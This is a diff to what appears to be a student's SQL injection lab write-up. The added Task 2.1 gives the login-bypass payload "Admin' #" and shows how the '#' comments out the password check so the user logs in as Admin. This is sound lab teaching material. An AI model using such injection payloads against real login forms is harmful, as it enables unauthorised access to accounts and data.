@@ -11,3 +11,16 @@ Use Such a SQL Query:
 select * from credential where Name = 'Alice';
 
 Screen shoot is in SQL Injection Folder
+Task 2
+Task 2.1
+USERNAME: "Admin' #"
+PASSWORD: "***" whatever the password was
+It will result in a SQL Query as:
+SELECT id, name, eid, salary, birth, ssn, address, email,
+nickname, Password
+FROM credential
+WHERE name= 'Admin' #' and Password='***'
+
+Then statement after # will bi regarded as comments. So we can login in as Admin.
+
+Screen shoot is in SQL Injection Folder
